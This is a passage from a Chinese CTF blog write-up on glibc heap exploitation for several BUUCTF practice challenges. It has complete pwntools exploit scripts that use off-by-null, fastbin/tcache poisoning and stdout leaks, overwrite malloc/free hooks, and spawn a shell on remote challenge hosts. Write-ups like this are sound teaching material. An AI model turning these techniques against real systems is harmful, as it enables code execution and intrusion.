class="comment">#确保这个_lock字段的值是正常的</span></span><br><span class="line">edit(-<span class="number">0x10</span>,<span class="number">0xf0</span>,<span class="built_in">bytes</span>(file))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220826112921840-1751167110.png"></p>
<h4 id="思路二：利用off-by-null"><a href="#思路二：利用off-by-null" class="headerlink" title="思路二：利用off_by_null"></a>思路二：利用off_by_null</h4><p>这个思路比较常规，也比较麻烦。</p>
<p>主要是通过两次off by null造成两次堆块重叠，然后将unsorted bin中的fd指针写入fastbin中的fd位置。然后打fastbin attack进行io leak。最后再打fastbin attack往malloc_hook中写入one_gadget。</p>
<p>整体来说最麻烦的部分就是将unsorted bin中的fd指针写入fastbin中的fd位置。</p>
<p>这里的具体过程如下：</p>
<blockquote>
<p><strong>利用off by one(null)先打一个堆块重叠，然后在bss段上留下两个spy chunk的地址</strong>，将其中一个释放掉进入fast bin中，那么此时bss段上还有一个spy chunk的地址。但此时的unsorted bin的地址已经低于了spy chunk的地址，那就将unsorted bin中的堆块都申请回来。然后再次利用off by one(null)做一个堆块重叠，这次<strong>将merged chunk申请回来后，unsorted bin的fd指针就自然落到了spy chunk的fd指针上(别忘了此时这个堆块也位于fastbin中)，这样unsorted bin中的fd指针就落到了fast bin中</strong>，同时bss段上仍然存在一个spy chunk的地址，这样编辑该堆块就可以控制unsorted bin中的fd指针，此时的size是unsorted bin范围里的大size(无法直接将其申请出来)，此时我们应该去将merged chunk释放掉，然后unsorted bin向上合并(向低地址合并)，而原本spy chunk的fd并不会消失，然后再次申请一个len(merged chunk)+0x10+2 大小的chunk，这样往这个新chunk写入数据的时候，就可以控制spy chunk的size，顺便还能把spy chunk的fd(也就是main_arena+88)的后两字节给修改到stdout结构体上方。</p>
</blockquote>
<h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP:"></a>EXP:</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_a=<span class="number">0xF1B</span></span><br><span class="line">d_d=<span class="number">0xF27</span></span><br><span class="line">d_e=<span class="number">0xF3f</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content,choice=<span class="number">1</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Input the content:\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Input the content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content,choice=<span class="number">1</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Input new content:\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Input new content:&#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Delete success\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0xf0</span>,<span class="string">&#x27;c&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">2</span>)<span class="comment">#merge succeeded</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0xf0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#add(0x100,&#x27;a&#x27;)</span></span><br><span class="line"> </span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">2</span>,<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x70</span>+<span class="number">0x90</span>))</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a,d_e,0xB64)   </span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add((<span class="number">0x80</span>+<span class="number">0x10</span>+<span class="number">2</span>),p64(<span class="number">0</span>)*<span class="number">17</span>+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\xdd\x25&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x59</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x60&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">    leak_libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3c56a4</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    one_gadget=search_og(<span class="number">3</span>)+libc_base</span><br><span class="line">    log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">2</span>,<span class="number">0x68</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x13</span>+p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the size:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x60</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29269</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220826111533151-552713986.png"></p>
<h2 id="TWCTF-online-2019-asterisk-alloc"><a href="#TWCTF-online-2019-asterisk-alloc" class="headerlink" title="TWCTF_online_2019_asterisk_alloc"></a>TWCTF_online_2019_asterisk_alloc</h2><h3 id="收获与总结："><a href="#收获与总结：" class="headerlink" title="收获与总结："></a>收获与总结：</h3><p>这道题主要就是realloc函数的妙用，学到了关于这个函数很多新知识。这个函数会根据参数的不同来实现不同的功能，具体情况如下：</p>
<blockquote>
<p>realloc(ptr,size)函数</p>
<p>当size不合法，比如-1时，realloc函数就会返回NULL。</p>
<p>当size为0且ptr存在时，就会执行free(ptr)且返回NULL</p>
<p>当size正常且ptr不存在时，就会执行malloc(ptr)</p>
<p>当size正常且ptr存在时，这就涉及到了两种情况，第一种是size大于了ptr指向堆块的size，这种情况先判断ptr指向的堆块能否与top chunk或者位于高地址且free状态的堆块合并，如果合并后二者大小满足size则进行合并。如果不能合并的话再去申请一块新的内存，将原来的数据拷贝过来，再释放之前的堆块。第二种是size小于了ptr指向堆块的size，这种情况会留下size大小的堆块，将剩余部分的堆块给释放掉。</p>
</blockquote>
<h3 id="保护策略：-2"><a href="#保护策略：-2" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/2706180-20220826113015547-280603116.png"></p>
<h3 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p><img src="/../img/2706180-20220826113031894-2049890680.png"></p>
<p>free的时候没有将指针置空，存在UAF漏洞。当UAF配上2.27-3ubuntu1这个版本，实在是舒服至极，因为我们可以直接使用tcache dup。同时这道题保护为FULL RELRO还没有打印函数，那就可以基本确定打IO leak了。</p>
<h3 id="程序简单分析："><a href="#程序简单分析：" class="headerlink" title="程序简单分析："></a>程序简单分析：</h3><p>这道题有一点点特殊，没有edit函数没有show函数。但是add函数里存在三个申请内存的函数，分别是malloc calloc realloc函数。通过观察add和delete函数的代码，发现malloc和calloc函数只能用一次，因此这道题只能将目光放到realloc函数上。realloc函数对于参数的不同，自身也有很多不同的功能（文章开始已经说明了）</p>
<p>这道题的核心点并不是在于怎么将unsorted bin中的fd指针给弄到tcachebin上，这一点有好几种方法都可以，难点是不太好编辑这个unsorted bin中的fd指针。这里采用的方法是申请一个大堆块A，然后再用realloc函数申请一个小堆块B(要保证A_size-B_size&gt;0x80,让其满足释放后可以进入unsorted bin的大小)，由于堆块B的size小于A，这样就保留堆块B大小的size，将堆块A的剩余部分(堆块C)释放掉。然后释放八次堆块C，这样C就进入了unsorted bin中，然后我们执行realloc(ptr_B,sizeof(堆块A))，此时的效果就是将堆块C申请回来与堆块B合并成为了堆块A，而我们的数据就可以去正常编辑原本堆块C的unsorted bin的fd指针了。</p>
<p>剩下就是常规操作打一个tcache dup+poisoning将free_hook申请出来最后释放掉存有&#x2F;bin&#x2F;sh字符串的堆块了。</p>
<p>整个过程就在于一个realloc函数的妙用，因为我们要不断的改变并控制ptr_r那个值，所以经常穿插将其size设置为0或者-1。</p>
<h3 id="调试过程："><a href="#调试过程：" class="headerlink" title="调试过程："></a>调试过程：</h3><p>下图为free掉一个堆块八次，然后unsorted bin中的fd指针就出现到了tcachebin中</p>
<p><img src="/../img/2706180-20220826113058600-240750503.png"></p>
<p>这部分的exp如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add_r(<span class="number">0x100</span>,<span class="string">&#x27;aaaaaaaaa&#x27;</span>)<span class="comment">#这是大堆块	</span></span><br><span class="line">add_r(<span class="number">0x40</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#执行完这行代码，上面的这个大堆块就变成了0x50的可用堆块和0xc0的free状态堆块</span></span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#不过在这步的时候0x50这个堆块也被释放了</span></span><br><span class="line">add_r(<span class="number">0x20</span>,<span class="string">&#x27;prevent chunk&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p>接着我们要先控制ptr_r的值为0x50堆块的那个地址，所以我们先将其申请回来，然后我们再申请0x100这个大堆块，这样realloc函数就会向下合并(向高地址合并)。</p>
<p><img src="/../img/2706180-20220826113121671-909787527.png"><br><img src="/../img/2706180-20220826113129858-1012521380.png"></p>
<p>因为合并后可以写入0x100的数据，因此我们就可以直接控制堆块的fd指针，将其改为stdout结构体地址。</p>
<p>这步的exp为：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add_r(<span class="number">0x40</span>,<span class="string">&#x27;sss&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0x100</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0xc1</span>)+<span class="string">b&#x27;\x60\xc7&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p>然后剩下的部分就是常规操作的tcache dup+tcache poisoning了。<strong>要注意的是需要穿插realloc(ptr_r,-1)来控制ptr_r为空，再进行realloc时才是malloc函数。否则无法正常完成tcache poisoning。</strong></p>
<p>剩下这部分exp为：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add_r(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add_m(<span class="number">0xb0</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3ed8b0</span></span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add_r(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0x30</span>,p64(free_hook))</span><br><span class="line">add_r(-<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0x30</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">add_r(-<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0x30</span>,p64(sys_addr))</span><br><span class="line">add_c(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>最后放一下完整的exp<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p,e,libc=load(&#x27;a&#x27;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/hacker/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_m</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Data: &#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_c</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Data: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_r</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Data: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">Which</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Which: &#x27;</span>, <span class="built_in">str</span>(Which))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add_r(<span class="number">0x100</span>,<span class="string">&#x27;aaaaaaaaa&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x40</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x20</span>,<span class="string">&#x27;prevent chunk&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    add_r(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x40</span>,<span class="string">&#x27;sss&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    add_r(<span class="number">0x100</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0xc1</span>)+<span class="string">b&#x27;\x60\xc7&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,0xDD0,0xDD7,0xdde,0xde5)</span></span><br><span class="line">    add_r(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add_m(<span class="number">0xb0</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3ed8b0</span></span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add_r(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    delete(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x30</span>,p64(free_hook))</span><br><span class="line">    add_r(-<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x30</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">    add_r(-<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x30</span>,p64(sys_addr))</span><br><span class="line">    add_c(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    delete(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="comment">#pwn()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27177</span>)</span><br><span class="line">        <span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220826111557058-2083144726.png"></p>
<h2 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a>roarctf_2019_realloc_magic</h2><h3 id="保护策略：-3"><a href="#保护策略：-3" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/2706180-20220826111633948-308368104.png"></p>
<p>这道题和上面那道题基本上一模一样，思路啥的也都一样。具体就不再放调试的图片了。具体的过程写到exp的注释里了。</p>
<p>一句话总结这题和上面那道题就是利用realloc向下合并的漏洞在tcachebin中踩出unsorted bin的fd指针。</p>
<h3 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP:"></a>EXP:</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#e=ELF(&#x27;./a&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/home/hacker/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size?\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content?\n&#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#先申请一个大堆块A</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#然后realloc申请size为0的堆块，置空其指针</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#申请一个用来防止合并的小堆块</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#realloc申请size为0的堆块，置空其指针</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#因为刚才申请size为0的堆块的时候，这个堆块A被释放了，现在再申请回来</span></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;s&#x27;</span>)<span class="comment">#此时堆块A变成了使用状态的堆块B+空闲状态的堆块C 堆块B为0x70 堆块C为0x80</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#置空指针</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;uuuu&#x27;</span>)<span class="comment">#将堆块C申请出来</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete()</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#上面释放了堆块C七次，加上这一次，堆块C成功进入了unsorted bin中</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#将堆块B申请回来</span></span><br><span class="line">    add(<span class="number">0x100</span>,p64(<span class="number">0x0</span>)*<span class="number">15</span>+p64(<span class="number">0x81</span>)+<span class="string">b&#x27;\x60\x87&#x27;</span>)<span class="comment">#利用realloc函数，向下合并空闲堆块，至此堆块A回来了，我们向堆块A写入数据就可以编辑原本堆块C的fd指针，从而将其改写为stdout结构体地址</span></span><br><span class="line">    <span class="comment">#上面步骤最核心的地方是这个0x81，本来这个位置的堆块C的实际大小为0x91，但如果我们不修改它，之后的tcache dup+tcache poisoning是没法进行的，必须要破坏它的size，才能保证下面步骤的正确进行。</span></span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,0xba2,0xbae,0xA76)</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x80</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)<span class="comment">#将stdout结构体申请了出来</span></span><br><span class="line">    leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3ed8b0</span></span><br><span class="line"></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">666</span>))<span class="comment">#清空ptr指针，因为此时的ptr指针就是stdout结构体地址，如果对这个地址进行释放的话，程序会崩溃，因此我们需要用唯一的机会将其置零</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#接下来就是重复上面的步骤 tcache dup+tcache poisoning 往free_hook中写入system地址</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span 